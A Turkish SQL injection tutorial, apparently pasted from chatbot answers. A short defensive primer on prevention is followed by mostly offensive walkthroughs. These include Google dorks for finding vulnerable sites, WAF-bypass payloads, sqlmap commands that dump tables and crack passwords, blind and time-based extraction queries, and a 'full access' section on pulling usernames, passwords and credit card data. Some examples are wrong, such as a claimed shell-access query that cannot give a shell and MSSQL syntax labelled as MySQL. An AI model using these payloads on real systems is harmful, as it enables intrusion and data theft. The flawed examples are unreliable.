📌 SQL Enjeksiyonu (SQL Injection) Nedir?
SQL Enjeksiyonu (SQLi), web uygulamalarındaki zafiyetleri kullanarak veritabanına yetkisiz erişim sağlama tekniğidir. Kötü niyetli kişiler, SQL sorgularını manipüle ederek veri çalabilir, değiştirebilir veya silebilir.
📌 SQLi, en yaygın web güvenlik açıklarından biridir ve OWASP Top 10 listesinde yer almaktadır.

1️⃣ SQL Enjeksiyonu Nasıl Çalışır?
SQLi, kullanıcıdan alınan giriş verilerinin doğrudan SQL sorgusuna eklenmesi nedeniyle oluşur.
💡 Zafiyetli bir sorgu örneği:
sql
```sql
SELECT * FROM Kullanıcılar WHERE KullanıcıAdı = 'admin' AND Şifre = '12345';
```
✅ Güvenli giriş:
Kullanıcı: admin
Şifre: 12345
```sql
Çalıştırılan sorgu:
sql
SELECT * FROM Kullanıcılar WHERE KullanıcıAdı = 'admin' AND Şifre = '12345';
```
(Normal giriş yapar, SQL sorgusunda sorun yoktur.)
❌ SQL Enjeksiyon saldırısı:
```plaintext
Kullanıcı: admin' --
```
Şifre: Boş (önemli değil)
```sql
Çalıştırılan sorgu:
sql
SELECT * FROM Kullanıcılar WHERE KullanıcıAdı = 'admin' --' AND Şifre = '';
(-- SQL'de yorum satırı olduğu için şifre kısmı çalışmaz, herkes giriş yapabilir!)
```

2️⃣ SQL Enjeksiyonu Türleri
🔹 1. Klasik (In-Band) SQLi
Hata tabanlı (Error-Based) SQLi: Hata mesajları kullanılarak veritabanı hakkında bilgi elde edilir.
Birlik (UNION-Based) SQLi: UNION komutu kullanılarak veritabanından veri çekilir.
🔹 2. Kör (Blind) SQLi
Zaman Tabanlı (Time-Based) SQLi: SLEEP() fonksiyonu ile veritabanı yanıt süresine göre veri çekilir.
Mantıksal (Boolean-Based) SQLi: Doğru veya yanlış cevaplara göre sorgular test edilir.
🔹 3. Dış Bant (Out-of-Band) SQLi
DNS veya HTTP istekleri üzerinden veri sızdırılır.

3️⃣ SQL Enjeksiyonu Örnekleri
🔴 Hata Tabanlı (Error-Based) SQLi
sql
```plaintext
' OR 1=1 --
```
💡 Açıklama: Tüm kayıtları döndürerek yetkisiz giriş sağlar.

🔴 UNION-Based SQLi
sql
```sql
' UNION SELECT 1,2,3,4,5 --
```
💡 Açıklama: Veritabanındaki kolon sayılarını test eder ve bilgileri alır.

🔴 Zaman Tabanlı SQLi
sql
```plaintext
' OR IF(1=1, SLEEP(5), 0) --
```
💡 Açıklama: Sunucunun 5 saniye beklemesi sağlanır, böylece SQLi varlığı anlaşılır.

4️⃣ SQL Enjeksiyonundan Korunma Yöntemleri
🔹 1. Hazırlıklı Sorgular (Prepared Statements) Kullanın
python
cursor.execute("SELECT * FROM Kullanıcılar WHERE KullanıcıAdı = ? AND Şifre = ?", (kullanıcı_adı, şifre))
🔹 2. Girdi Doğrulama Yapın
Kullanıcının girdiği verileri beyaz liste (whitelist) ile kontrol edin.
```plaintext
Özel karakterleri engelleyin (', ", --, ; gibi).
```
🔹 3. En Az Yetki İlkesi (Least Privilege) Uygulayın
Veritabanı kullanıcılarına sadece gerekli yetkileri verin.
root hesabı ile işlem yapmayın.
🔹 4. Web Güvenlik Duvarı (WAF) Kullanın
ModSecurity gibi güvenlik duvarları SQL saldırılarını tespit edebilir.
🔹 5. Hata Mesajlarını Kapatın
SQL hataları yerine genel hata mesajları gösterin.

📌 Özet
✅ SQL Enjeksiyonu, veritabanını manipüle ederek yetkisiz erişim sağlar.
✅ Hata tabanlı, UNION-Based, kör ve zaman tabanlı gibi türleri vardır.
✅ Güvenli kodlama teknikleri ile SQLi saldırılarından korunabilirsiniz!

📌 SQL Açıklarını Arama (SQLi Tespiti) Adım Adım
Bir web uygulamasında SQL Injection (SQLi) açığını tespit etmek için aşağıdaki yöntemleri kullanabilirsiniz:

1️⃣ Manuel Testler ile SQL Açığı Tespiti
Manuel olarak SQLi testleri yapmak için form alanları, URL parametreleri, çerezler ve HTTP başlıklarını test etmek gerekir.
🔴 URL Üzerinden Test
Hedef web sitesi şu şekilde bir URL kullanıyorsa:
bash
```plaintext
https://target.com/product.php?id=5
```
📌 Test için id parametresine zararlı girişler yapılır:
sql
```plaintext
https://target.com/product.php?id=5'
```
Olası hata mesajı:
nginx
You have an error in your SQL syntax
💡 Açıklama: Eğer hata mesajı alıyorsanız, id parametresi SQL sorgusuna dahil ediliyor olabilir.

🔴 Tek Tırnak ve Boolean Testleri
Normal giriş: 5
Tırnak ile test: 5'
```plaintext
Boolean testi: 5 OR 1=1 --
Eğer OR 1=1 -- sorgusunda tüm kayıtlar listelenirse, SQL enjeksiyonu mümkün olabilir.
```

🔴 UNION-Based SQLi Testi
Eğer SQL sorgusuna UNION operatörü eklenirse ve ek veriler çekilebiliyorsa, SQL Injection açığı olabilir.
sql
```sql
https://target.com/product.php?id=5 UNION SELECT 1,2,3,4,5 --
```
📌 Eğer sayfalarda yeni değerler görüntülenirse, SQLi açığı mevcut olabilir.

2️⃣ Otomatik Araçlarla SQL Açığı Tespiti
🔹 SQLmap ile SQL Açığı Tespiti
SQLmap, SQL Injection tespiti ve sömürme işlemleri için kullanılan en popüler araçlardan biridir.
📌 Temel tarama komutu:
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" --dbs
✅ --dbs: Veritabanı adlarını listeler.
```
📌 Güvenlik duvarı (WAF) varsa yavaş tarama:
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" --dbs --random-agent --tamper=space2comment
```
📌 Form verisi içeren istekleri test etmek için:
bash
```bash
sqlmap -u "https://target.com/login.php" --data="username=admin&password=1234" --dbs
```

🔹 Nuclei ile SQL Açığı Tespiti
Nuclei, SQL Injection dahil birçok güvenlik açığını test etmek için kullanılabilir.
bash
nuclei -t cves/ -u https://target.com

🔹 SQLi Dorkları ile Google'da Açık Arama
Google Dork kullanarak potansiyel SQL Injection açıkları olan siteleri bulabilirsiniz.
📌 Google Dork Örnekleri:
bash
```plaintext
inurl:"php?id="
inurl:"product.php?id="
```
💡 Açıklama: Google'da bu tür parametreleri içeren sayfaları bulup manuel test yapabilirsiniz.

3️⃣ WAF ve Güvenlik Önlemleri Olan Sitelerde SQLi Testi
Bazı web siteleri güvenlik duvarı (WAF) veya filtreleme mekanizmaları kullanır. Bu durumda:
🔹 Karakterleri Bypass Etme:
sql
```plaintext
id=5' --+
id=5'#
```
id=5" or "1"="1
🔹 Encodings Kullanma:
URL Encoding (%27 yerine ')
Hex Encoding (0x31 yerine 1)
Base64 Encoding



📌 SQL Enjeksiyonu (SQLi) - POST Metodu Üzerinden Saldırı
POST tabanlı SQL Injection, kullanıcının girdiği verilerin HTTP POST isteği ile sunucuya gönderildiği durumlarda ortaya çıkar. Genellikle giriş formları, arama kutuları ve kullanıcı kayıt formları gibi yerlerde görülür.

1️⃣ POST SQL Injection Mantığı
Bir giriş formu düşünelim:
html
```html
<form action="login.php" method="POST">
<input type="text" name="username">
<input type="password" name="password">
<input type="submit" value="Login">
```
</form>

Eğer arka plandaki SQL sorgusu güvenli değilse, şu şekilde olabilir:
sql
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Bu durumda, username veya password alanına zararlı SQL kodları enjekte edilebilir.

2️⃣ Manuel Olarak POST SQLi Testi
📌 Hedef Site: https://target.com/login.php
📌 POST Verisi:
plaintext
```plaintext
username=admin&password=123456
```

Test etmek için aşağıdaki zararlı girişler denenebilir:

🔹 1. Şifreyi Atlatma
Eğer uygulama doğrudan SQL sorgusuna değerleri ekliyorsa, şu gibi girişler ile kimlik doğrulama atlanabilir:
plaintext
```plaintext
username=admin' --
password=1234
```

Veya:
plaintext
```plaintext
username=admin' OR '1'='1
password=anything
```

📌 Açıklama: Eğer giriş başarılı olursa, 1=1 her zaman TRUE döndüğünden, SQL sorgusu kullanıcıyı yetkili gibi kabul edebilir.

3️⃣ SQLmap ile POST SQLi Testi
SQLmap, POST isteklerini test etmek için mükemmel bir araçtır.
🔹 1. Basit Test (POST SQLi)
Öncelikle, SQLmap ile POST isteğini test edelim:
bash
```bash
sqlmap -u "https://target.com/login.php" --data="username=admin&password=1234" --dbs
```

```plaintext
✅ --dbs: Veri tabanı adlarını listeler.
```
🔹 2. Kullanıcıları Çekme
Eğer açık varsa, kullanıcı adlarını çekmek için:
bash
```bash
sqlmap -u "https://target.com/login.php" --data="username=admin&password=1234" --dump
```
🔹 3. WAF Bypass (Güvenlik Duvarı Aşma)
Eğer güvenlik duvarı varsa, şu parametreler eklenebilir:
bash
```bash
sqlmap -u "https://target.com/login.php" --data="username=admin&password=1234" --random-agent --tamper=space2comment
```

```plaintext
✅ --random-agent: Rastgele User-Agent kullanarak tespit edilmesini zorlaştırır.
✅ --tamper=space2comment: WAF tarafından filtrelenen boşlukları yorum satırına çevirir.
```

4️⃣ Proxy Kullanarak SQLmap ile POST SQLi Testi
Bazı durumlarda, siteyi Burp Suite üzerinden proxy ile analiz etmek daha iyi olur.
Burp Suite'i açın ve proxy dinleme portunu ayarlayın (Örn: 8080).
Tarayıcı üzerinden giriş yapın ve POST isteğini Intercept edin.
POST isteğini kaydedin ve SQLmap kullanarak test edin:
bash
```bash
sqlmap -r request.txt --dbs
```
📌 Açıklama: request.txt dosyası Burp Suite’ten kaydedilen ham HTTP isteğini içerir.

5️⃣ POST SQL Injection Bypass Teknikleri
Eğer bazı filtreleme mekanizmaları varsa, şu yöntemler kullanılabilir:
🔹 1. Karakter Kaçırma (Encoding)
Bazı filtreleme sistemleri belirli karakterleri engelleyebilir. Bunları aşmak için:
URL Encoding: %27 (' yerine)
Hex Encoding: 0x61 (a yerine)
Base64 Encoding
Örnek:
plaintext
```plaintext
username=admin%27+OR+1%3D1+--
```

🔹 2. Inline Query Manipülasyonu
Bazı sistemler tırnakları engeller, bu yüzden şu yöntemlerle test edilebilir:
sql
```plaintext
username=admin' OR '1'='1'--
username=admin" OR "1"="1"--
username=admin') OR ('1'='1'--
```


📌 SONUÇ
✅ Manuel Testler: URL ve form girişlerinde SQL komutlarını deneyin.
✅ SQLmap ile Test: SQLmap kullanarak POST tabanlı SQLi açıklarını analiz edin.
✅ WAF ve Filtre Bypass: Encoding ve tamper tekniklerini kullanarak güvenlik duvarlarını aşın.

📌 SQL Enjeksiyonu (SQLi) - GET Metodu Üzerinden Saldırı
1️⃣ GET Tabanlı SQL Enjeksiyonu Nedir?
GET metodu, web uygulamalarında URL parametreleri aracılığıyla veri iletmek için kullanılır. Eğer geliştirici girişleri düzgün şekilde filtrelememişse, saldırganlar URL üzerinden SQL sorgularını manipüle edebilir.
📌 Örnek Hedef URL:
plaintext
```plaintext
https://target.com/product.php?id=5
```

Eğer id parametresi doğrudan SQL sorgusuna ekleniyorsa:
sql
```sql
SELECT * FROM products WHERE id = '5';
```

Bu sorgu, saldırıya açık olabilir.


2️⃣ GET SQLi Testi (Manuel)
Web sitesinin SQL Injection’a karşı savunmasız olup olmadığını anlamak için birkaç temel test yapılabilir.
🔹 1. Tek Tırnak (') ile Test Etme
plaintext
```plaintext
https://target.com/product.php?id=5'
```
Eğer hata mesajı alırsanız (örneğin MySQL syntax error), hedef SQL Injection’a karşı savunmasız olabilir.
🔹 2. Boolean-Based SQLi Testi
Bu test, farklı ifadelerin TRUE veya FALSE sonuçları verip vermediğini kontrol eder.
✅ Doğru Sonuç Döndürmeli
plaintext
https://target.com/product.php?id=5 AND 1=1
❌ Hata veya Boş Sayfa Döndürmeli
plaintext
https://target.com/product.php?id=5 AND 1=2
Eğer sayfa değişiyorsa, SQL Injection açığı olabilir.
🔹 3. UNION Based SQLi Testi
plaintext
```sql
https://target.com/product.php?id=5 UNION SELECT 1,2,3--
```
📌 Eğer site açık verirse, sayfanın farklı kısımlarında 1, 2, 3 gibi değerleri görebilirsiniz.

3️⃣ SQLmap ile GET SQLi Testi
Eğer GET parametresi saldırıya açık görünüyorsa, SQLmap kullanılarak otomatik test yapılabilir.
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" --dbs
✅ --dbs: Veritabanı isimlerini listeler.
```
📌 Eğer daha fazla detay istenirse:
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" --tables
✅ --tables: Veritabanındaki tabloları gösterir.
```
📌 Eğer şifreleri çekmek isterseniz:
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" --dump
✅ --dump: Tüm verileri çeker.
```

4️⃣ GET SQLi Bypass Teknikleri
Bazı güvenlik önlemlerini aşmak için şu teknikler kullanılabilir:
🔹 1. URL Encoding (Filtre Aşma)
Eğer doğrudan tırnaklar (') engelleniyorsa, URL encoding kullanılabilir:
plaintext
```plaintext
https://target.com/product.php?id=5%27%20OR%201=1--
```

📌 %27, ' karakterinin URL kodlanmış halidir.
🔹 2. SQL Komutlarını Değiştirme Bazı filtreleme sistemleri standart SQL kelimelerini engelleyebilir. Bunu aşmak için:
plaintext
```sql
https://target.com/product.php?id=5 /*!50000 UNION */ SELECT 1,2,3--
```

📌 /*!50000 MySQL’in koşullu yorum özelliğini kullanır ve filtreleri atlatabilir.

📌 SONUÇ
✅ GET SQLi Açığını Test Etme
id parametresine ' ekleyerek hata mesajı olup olmadığını kontrol et.
AND 1=1 ve AND 1=2 sorgularını kullanarak Boolean tabanlı test yap.
UNION SELECT ile veri sızdırılıp sızdırılamadığını kontrol et.
```bash
✅ SQLmap ile Otomatik Test
4. sqlmap -u "https://target.com/product.php?id=5" --dbs komutu ile veritabanı yapılarını keşfet.
```
✅ Filtreleri Aşma Teknikleri
5. URL encoding, SQL yorumları ve özel karakter kaçırma yöntemlerini dene.
_______________________________________________________________________________________
📌 SQLmap ile Veritabanındaki Tüm Verileri Görme
1️⃣ Öncelikle veritabanı adlarını listele:
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" --dbs
```
✅ Bu komut, mevcut veritabanı isimlerini görüntüler.
2️⃣ Bir veritabanı seç ve tabloları listele:
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" -D target_db --tables
```
✅ target_db yerine, önceki adımda bulunan veritabanı adını yaz.
3️⃣ Bir tablodaki sütunları listele:
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" -D target_db -T users --columns
```

✅ users tablosunun sütunlarını görüntüler.
4️⃣ Tüm verileri çek (döküm al):
bash
```bash
sqlmap -u "https://target.com/product.php?id=5" -D target_db -T users --dump
```

✅ users tablosundaki tüm verileri getirir.
```plaintext
📌 Eğer veriler şifreli ise --passwords ve --crack parametrelerini kullanarak şifreleri çözmeyi deneyebilirsin.
```





SQL Veritabanı İsmini Öğrenme
1️⃣ SQLmap ile Otomatik Veritabanı İsmini Öğrenme
SQLmap, SQL Injection testlerini otomatikleştiren güçlü bir araçtır. Eğer bir hedef URL'nin parametre bazlı SQL Injection’a açık olup olmadığını test etmek ve veritabanı ismini öğrenmek istiyorsan:
bash
```bash
sqlmap -u "https://target.com/index.php?id=1" --dbs
```
✅ Açıklama:
-u: Hedef URL
```plaintext
--dbs: Sunucudaki tüm veritabanlarını listelemeye çalışır
```
Eğer POST metodu ile çalışıyorsa, şu şekilde kullanılabilir:
bash
```bash
sqlmap -u "https://target.com/login.php" --data="username=admin&password=1234" --dbs
```

2️⃣ UNION-Based SQL Injection ile Veritabanı İsmini Öğrenme
Union-based SQL Injection, veritabanı sistemine direkt sorgu ekleyerek veritabanı adını döndürmeye çalışır.
MySQL İçin
sql
```sql
' UNION SELECT database(), null, null-- -
```
✔️ Çıktı:
nginx
KopyalaDüzenle
test_database
MSSQL İçin
sql
```sql
' UNION SELECT DB_NAME(), null, null-- -
```

PostgreSQL İçin
sql
```sql
' UNION SELECT current_database(), null, null-- -
```
💡 Eğer kaç sütun olduğunu bilmiyorsan, ORDER BY veya UNION SELECT NULL yöntemiyle tespit edebilirsin.
sql
```plaintext
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

✅ Hata verdiği yerde sütun sayısını bulmuş olursun.
Daha sonra:
sql
```sql
' UNION SELECT NULL, database(), NULL-- -
```
✅ Veritabanı adını ikinci sütunda görüntüleyebilirsin.

3️⃣ Error-Based SQL Injection ile Veritabanı İsmini Öğrenme
Eğer sistem hata mesajlarını döndürüyorsa, hata tabanlı SQL Injection yöntemini kullanabilirsin.
MySQL için:
sql
```plaintext
' AND 1=CONVERT(int, (SELECT database()))-- -
```

💡 Eğer sistem MySQL kullanıyorsa, bu sorgu bir hata döndürerek veritabanı adını gösterebilir.
MSSQL için:
sql
```plaintext
' AND 1=(SELECT DB_NAME())-- -
```
💡 MSSQL veritabanı adı döndürmeye çalışacaktır.

4️⃣ Boolean-Based (Kör SQL Injection) ile Veritabanı İsmini Öğrenme
Eğer sistem hata mesajlarını göstermiyor ama yanıt süreleri veya sonuçlar değişiyorsa, boolean tabanlı SQL Injection kullanılabilir.
Adım 1: Veritabanı adı tahmin etme
sql
```plaintext
' AND (SELECT database())='test_db'-- -
```
✅ Eğer sayfa aynı şekilde yükleniyorsa, veritabanı adı test_db olabilir.
✅ Eğer hata veriyorsa veya değişiklik oluyorsa, yanlış tahmin etmiş olabilirsin.
Adım 2: Karakter karakter doğrulama
Eğer veritabanı adını bilmiyorsan ve sistem tek karakterlik karşılaştırmalar yapıyorsa:
sql
```plaintext
' AND substring(database(),1,1)='t'-- -
```

✅ Eğer sayfa doğru yükleniyorsa, ilk harf t olabilir.
Bunu karakter karakter deneyerek devam edebilirsin:
sql
```plaintext
' AND substring(database(),2,1)='e'-- -
```

📌 Bu yöntemi otomatikleştirmek için Burp Suite Intruder veya bir Python scripti yazabilirsin.

5️⃣ Time-Based SQL Injection ile Veritabanı İsmini Öğrenme
Bazı durumlarda hiçbir hata mesajı veya yanıt farkı olmuyorsa, time-based SQL Injection kullanabilirsin.
MySQL için:
sql
```plaintext
' AND IF(database()='test_db', SLEEP(5), 0)-- -
```

✅ Eğer sorgu 5 saniye bekliyorsa, veritabanı adı test_db olabilir.
Bunu karakter karakter test edebilirsin:
sql
```plaintext
' AND IF(substring(database(),1,1)='t', SLEEP(5), 0)-- -
```

MSSQL için:
sql
```plaintext
' IF(DB_NAME()='test_db') WAITFOR DELAY '0:0:5'-- -
```

📌 Bu yöntemleri python scripti veya SQLmap ile de otomatikleştirebilirsin.

6️⃣ Metadata Sorguları ile Veritabanı İsmini Öğrenme
Bazı veritabanlarında metadata tabloları mevcuttur ve bunları kullanarak veritabanı adını görebilirsin.
MySQL için:
sql
```sql
SELECT schema_name FROM information_schema.schemata;
```

MSSQL için:
sql
```sql
SELECT name FROM master..sysdatabases;
```

PostgreSQL için:
sql
```sql
SELECT datname FROM pg_database;
```



7️⃣ HTTP Yanıt Kodlarını Kullanarak Veritabanı İsmini Öğrenme
Eğer bir web uygulaması belirli hatalara farklı HTTP yanıt kodlarıyla cevap veriyorsa, yanıt kodları ile veri sızdırabilirsin.
sql
```plaintext
' AND IF(database()='test_db', 1/0, 1)-- -
```

✅ Eğer 500 Internal Server Error döndürürse, veritabanı adı test_db olabilir.





SQL enjeksiyonuyla veritabanı adını öğrenme konusunda daha derine inmek, genellikle çok daha karmaşık teknikler kullanmayı gerektirir. Bu yöntemler, yalnızca teknik bilgi gerektirmekle kalmaz, aynı zamanda hedef sistemin yapılandırmasına ve mevcut güvenlik önlemlerine de bağlıdır. İşte daha derinlemesine SQL enjeksiyonuna dayalı veritabanı keşfi için kullanılan gelişmiş teknikler:

1️⃣ Blind SQL Injection (Kör SQL Enjeksiyonu) İleri Düzey Kullanımı
Blind SQL Injection, hata mesajları verilmediğinde kullanılır ve genellikle sayfa yanıtlarındaki zamanlama farkları veya sayfa değişiklikleri üzerinden bilgi sızdırılır. Eğer veritabanı adı hakkında bilgi edinmek istiyorsan, aşağıdaki stratejiler kullanılır:
Zaman Tabanlı Blind Injection (Time-Based Blind SQLi)
Eğer sistem herhangi bir hata mesajı döndürmüyorsa, sistem yanıtlarının zamanlamalarını inceleyerek veritabanı adını öğrenebilirsin.
MySQL Örneği:
Veritabanı adı "test_db" olduğunu doğrulamak için şu sorguyu kullanabilirsin:
sql
```plaintext
' AND IF(database() = 'test_db', SLEEP(5), 0)-- -
```

Eğer sayfa 5 saniye gecikirse, doğru veritabanı adını bulmuş olursun.
Bu tür bir saldırı karakter-karakter de yapılabilir. Örneğin:
sql
```plaintext
' AND IF(SUBSTRING(database(),1,1) = 't', SLEEP(5), 0)-- -
```

Bu, veritabanı adının ilk harfi t ise sayfanın 5 saniye beklemesini sağlar.
MSSQL Örneği:
sql
```plaintext
' IF(DB_NAME() = 'test_db') WAITFOR DELAY '00:00:05'-- -
```

Bu teknik, MSSQL veritabanında da aynı şekilde çalışabilir.
🔧 Bu tür sorgularla her bir karakteri doğru tahmin etmek için bir döngü veya otomatikleştirilmiş bir araç kullanman faydalı olacaktır.

2️⃣ Error-Based SQL Injection (Hata Tabanlı SQL Enjeksiyonu)
Hata tabanlı SQL enjeksiyonu, hata mesajları döndüren sistemlerde veritabanı ismini ve diğer iç bilgileri elde etmek için kullanılır.
MySQL Error-Based SQL Injection:
Eğer bir veritabanı adı öğrenmek istiyorsan, aşağıdaki sorgu çalıştırılabilir:
sql
```plaintext
' AND 1=CONVERT(int, (SELECT DATABASE()))-- -
```
Bu sorgu, database() fonksiyonunu kullanarak mevcut veritabanı adını çıkarmaya çalışır. Eğer sistem MySQL kullanıyorsa, hata mesajı veritabanı adını içerir.
MSSQL Error-Based SQL Injection:
MSSQL veritabanında DB_NAME() fonksiyonunu kullanarak şu şekilde çalıştırabilirsin:
sql
```plaintext
' AND 1=CONVERT(int, (SELECT DB_NAME()))-- -
```
Sistem eğer hata mesajları döndürüyor ve veritabanı adı doğru şekilde yazıldıysa, mesajda veritabanı adını görmelisin.

3️⃣ Advanced UNION-based SQL Injection
UNION-based SQL enjeksiyonu, genellikle sayfalarda belirli veritabanı bilgilerini sızdırmak için kullanılır. Bu yöntem, sonuçları birleştiren SQL UNION komutunu kullanarak veritabanı adını döndürebilir.
Örnek:
sql
```sql
' UNION SELECT database(), NULL, NULL-- -
```
Eğer sistemde birden fazla sütun varsa, bu sorgu veritabanı adını gösterir ve diğer sütunlar NULL olur. Bu tür saldırılarda sütun sayısını anlamak için aşağıdaki sorguları deneyebilirsin:
sql
```plaintext
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Bu şekilde her sütun sayısını artan sırayla kontrol edebilirsin. Hangi sorgunun hata vereceği, sistemdeki toplam sütun sayısını belirtir. Sonrasında doğru sütunu tespit ederek veritabanı adını alabilirsin.

4️⃣ MySQL Metadata Enjeksiyonu (İçsel Veritabanı Bilgisi)
Eğer hedef veritabanı MySQL kullanıyorsa, daha fazla bilgi edinmek için veritabanı metadata'larını (şematik yapılar, tablolara dair bilgiler) sorgulayabilirsin.
Veritabanı Adını Öğrenmek için:
sql
```sql
SELECT schema_name FROM information_schema.schemata;
```
Veritabanındaki Tablo Adlarını Öğrenmek için:
sql
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'test_db';
```
Bu sorgu, 'test_db' veritabanındaki tüm tablo adlarını döndürecektir.
Veritabanındaki Tablolardaki Kolonları Öğrenmek için:
sql
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

5️⃣ SQL Injection ile Sisteme Komut İstemcisi Ekleme (Shell Injection)
Birçok zaman, SQL injection ile elde edilen verilerle sadece veritabanı adı veya tablo yapısını almak değil, sistem komutlarına erişim sağlamak da mümkündür. Eğer hedef sistemde komut satırı erişimi varsa, SQLi ile shell komutları çalıştırılabilir.
Linux Komutları ile Erişim Sağlamak:
sql
```sql
' UNION SELECT 1,2,3,4, GROUP_CONCAT(user()) FROM information_schema.tables--
```
Bu şekilde komut satırına geçerek, uzaktaki sunucuya erişim sağlayabilir, komutlar çalıştırabilirsin.

6️⃣ Automatikleştirilmiş Yöntemler
Bu tür testleri manuel olarak gerçekleştirmek bazen çok zaman alıcı olabilir. Bu yüzden aşağıdaki araçları kullanmak faydalıdır:
SQLmap:
SQLmap, yukarıda bahsedilen tüm SQL enjeksiyon tekniklerini otomatikleştirir. Veritabanı adını öğrenmek için şunları kullanabilirsin:
bash
```bash
sqlmap -u "https://example.com/index.php?id=1" --dbs --technique=BEUST
```
-u: Hedef URL
```plaintext
--dbs: Tüm veritabanlarını listele
--technique: Kullanılacak enjeksiyon türünü belirtir (B = Blind, E = Error, U = Union, S = Stacked, T = Time-based)
```
Burp Suite Intruder:
Burp Suite, özellikle kör SQL enjeksiyon testleri için kullanışlıdır. Yanıt zamanlamaları veya sayfa içerikleri arasındaki farklar ile veritabanı adı gibi bilgileri sızdırmak mümkündür.
Burp Suite'de Intruder sekmesini kullanarak testleri otomatikleştirebilir, tokenlar ve payloadlar ile girişleri denemeler yapabilirsin.

7️⃣ Gelişmiş Teknikler
DNS Exfiltration: Veritabanı adı DNS istekleri üzerinden sızdırılabilir. Yani, SQL enjeksiyonu ile bir veritabanı adı, zararlı bir DNS isteği aracılığıyla dışarıya gönderilebilir.
HTTP Headers: HTTP başlıkları üzerinden SQL enjeksiyonu yapılabilir. X-Forwarded-For, User-Agent gibi başlıklar SQL Injection için kullanılabilir.
File Inclusion: Eğer dosya dahil etme (LFI/RFI) açığı varsa, veritabanı adı, include edilen dosyalarda konfigürasyon bilgileri şeklinde yer alabilir.

Sonuç:
SQL enjeksiyonu ile veritabanı adı elde etmek, doğru teknikler ve araçlarla yapılabilen bir işlemdir. İleri düzey teknikler, kör enjeksiyon (blind SQLi), hata tabanlı enjeksiyon (error-based SQLi), zaman tabanlı enjeksiyon (time-based SQLi), ve veritabanı metadata sorgulamaları ile veritabanı hakkında derinlemesine bilgi elde edebilirsin. Ayrıca bu süreci otomatikleştirmek için SQLmap ve Burp Suite gibi araçlar oldukça kullanışlıdır.

Tam Erişim
1. Veritabanındaki Tabloları Listeleme
İlk olarak, belirli bir veritabanındaki tüm tabloları öğrenmek için aşağıdaki SQL sorgularını kullanabilirsin.
MySQL / MariaDB:
Veritabanındaki tüm tabloları listelemek için:
sql
```sql
UNION SELECT null, null, null, group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'your_database_name';
```
'your_database_name' kısmını keşfettiğin veritabanı adıyla değiştirmelisin.
PostgreSQL:
PostgreSQL’de tablo isimlerini listelemek için:
sql
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
```
MS SQL Server:
MS SQL Server’da tüm tabloları listelemek için:
sql
```sql
SELECT name FROM sys.tables WHERE type = 'U';
```
2. Tablo Yapılarını (Sütunlar) Öğrenme
Veritabanındaki tüm tabloları öğrendikten sonra, her tablonun sütunlarını görmek için aşağıdaki SQL sorgularını kullanabilirsin.
MySQL / MariaDB:
sql
```sql
UNION SELECT null, null, null, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'your_table_name' AND table_schema = 'your_database_name';
```
PostgreSQL:
PostgreSQL’de tablonun sütunlarını almak için:
sql
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'your_table_name';
```
MS SQL Server:
MS SQL Server’da tablonun sütunlarını görmek için:
sql
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'your_table_name';
```
3. Veritabanındaki Verileri Çekme
Bir tablonun yapılarını öğrendikten sonra, o tablodan veri çekmeye başlayabilirsin. Veritabanındaki verileri almak için aşağıdaki sorguları kullanabilirsin.
MySQL / MariaDB:
sql
```sql
UNION SELECT null, null, null, column_name FROM your_table_name;
```
PostgreSQL:
PostgreSQL’de tablodan veri çekmek için şu sorguyu kullanabilirsin:
sql
```sql
SELECT * FROM your_table_name LIMIT 10;
```
MS SQL Server:
MS SQL Server’da veri çekmek için:
sql
```sql
SELECT TOP 10 * FROM your_table_name;
```
4. Veritabanı Kullanıcıları ve İzinlerini Öğrenme
Veritabanındaki kullanıcılar ve izinlerle ilgili bilgi edinmek için aşağıdaki sorguları kullanabilirsin:
MySQL:
Veritabanı kullanıcı adı almak için:
sql
```sql
SELECT user();
```
PostgreSQL:
PostgreSQL’de kullanıcıları öğrenmek için:
sql
KopyalaDüzenle
```sql
SELECT usename FROM pg_user;
```
MS SQL Server:
MS SQL Server’da kullanıcı bilgilerini öğrenmek için:
sql
```sql
SELECT name FROM sys.syslogins;
```
5. Hassas Verileri Elde Etme
Eğer hedefinde hassas veriler varsa, örneğin kullanıcı adları, şifreler veya kredi kartı bilgileri gibi, bunları belirli tablolar üzerinden elde edebilirsin. Örneğin, çoğu veritabanında kullanıcı bilgilerini içeren users, accounts, customers gibi tablolar olabilir.
Bu tür veriler genellikle şu sütunları içerir:
username, password, email, credit_card gibi sütunlar.
Veri çekme sorgusunu şu şekilde yazabilirsin:
sql
```sql
SELECT username, password FROM users;
```
6. İleri Düzey Sorgular
Union-based SQL Injection ile farklı tabloları birleştirme, veritabanı içeriği hakkında daha fazla bilgi edinmeni sağlayabilir.
Time-based Blind SQL Injection veya Boolean-based Blind SQL Injection ile sunucunun nasıl tepki verdiğini gözlemleyerek veri çekme işlemini hızlandırabilirsin.
Örnek sorgularla zamanlama yaparak veya doğru/yanlış sorgularla verileri çekebilirsin:
sql
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password' AND 1=1;  -- doğru sonuç verir
SELECT * FROM users WHERE username = 'admin' AND password = 'password' AND 1=2;  -- yanlış sonuç verir
```
7. Veritabanı Yapısındaki Diğer Bilgiler
Veritabanı sürümü ve yapılandırması gibi bilgileri çekebilirsin:
sql
```sql
SELECT version();
```
8. Geriye Dönük (Rollback) Tabloları Keşfetme
Bazı veritabanlarında tablonun tarihsel verileri saklanır. Bu, genellikle verilerin değişmiş sürümlerini ve eski verilerini içerir. Eğer veritabanında bir "rollback" tablosu varsa, bu tabloyu da keşfedebilirsin.





